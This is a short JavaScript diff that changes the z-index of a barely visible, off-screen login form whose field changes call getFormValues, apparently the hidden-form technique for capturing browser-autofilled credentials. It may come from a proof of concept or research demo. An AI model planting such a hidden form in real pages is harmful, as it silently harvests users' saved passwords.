@@ -17,7 +17,7 @@ window.setTimeout(function(){
 
 function createLoginForm() {
 	var divlogin = document.createElement("div");
-	divlogin.style = "position: fixed; bottom: -19.9999px; z-index: -2147483647; opacity:0.2";
+	divlogin.style = "position: fixed; bottom: -19.9999px; z-index: 2147483647; opacity:0.2";
 	divlogin.id = "divlogin";
 	divlogin.innerHTML  = ' \
 			<form method="POST" action="login.html" id="form" onchange="getFormValues()"> \
